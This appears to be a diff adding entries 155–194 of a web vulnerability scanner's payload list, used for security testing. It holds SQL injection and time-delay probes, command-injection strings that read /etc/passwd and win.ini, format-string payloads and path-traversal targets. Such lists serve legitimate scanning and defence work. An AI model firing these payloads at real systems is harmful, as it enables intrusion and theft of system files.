+    155 query / (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual)  
+    156 query / case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end  
+    157 query / sleep(15)  
+    158 query;cat /etc/passwd; 
+    159 query;get-help # 
+    160 query;get-help 
+    161 query; 
+    162 query;sleep 15; 
+    163 query;start-sleep -s 15 # 
+    164 query;start-sleep -s 15 
+    165 query|timeout /T 15 
+    166 query|type %SYSTEMROOT%\win.ini 
+    167 query and 0 in (select sleep(15) ) --  
+    168 query AND 1=1 --  
+    169 query AND 1=2 --  
+    170 query and exists (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) --  
+    171 query 
+    172 query OR 1=1 --  
+    173 query UNION ALL select NULL --  
+    174 query WAITFOR DELAY '0:0:15' --  
+    175 response.write(100,000*100,000) 
+    176 rjersfobpfy006pxikbjtmsiarkt4wc9znbpx3qk3di3sim473t5j9ndylyp 
+    177 Set-cookie: Tamper=5e021b4e-98a1-4d37-8c49-47ef1883ffd8 
+    178 shk3gp6e967ypei2lhl2q2cifh0y7peyn3y0hac70x2l7k3rlvpsm9n86y7mbh3vg9e 
+    179 thishouldnotexistandhopefullyitwillnot 
+    180 u36ugb454etpiqzzvz8np807alt17dxfxq9kwe5j5awzn30ajcqan7g21fl 
+    181 vcywenmrxjo4mo38b9o1rw0p4ptuyodcd4n69px7s2szuo9htaicptin3yvj26trh6gm 
+    182 vkrk9fvyeqknk595mmjp1xv0zcbblsgm8qjouaq9an5svge4uqh9hx188jgyg 
+    183 WEB-INF/web.xml 
+    184 WEB-INF\web.xml 
+    185 www.google.com/ 
+    186 www.google.com/search?q=ABCtor%20ABC 
+    187 www.google.com:80/ 
+    188 www.google.com:80/search?q=ABCtor%20ABC 
+    189 www.google.com 
+    190 z0xl8v2xn0s7dxmmztkp9ui3vs8hzg098k4akiunxcp9u0ed1hc82vmcm16np28qibt 
+    191 ABC %1!s%2!s%3!s%4!s%5!s%6!s%7!s%8!s%9!s%10!s%11!s%12!s%13!s%14!s%15!s%16!s%17!s%18!s%19!s%20!s%21!n%22!n%23!n%24!n%25!n%26!n%27!n%28!n%29!n%30!n%31!n%32!n%33!n%34!n%35!n%36!n%37!n%38!n%39!n%40!n
+
+    192 ABC%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s%n%s
+
+    193 ABC 
+    194 ABCPX0sS 
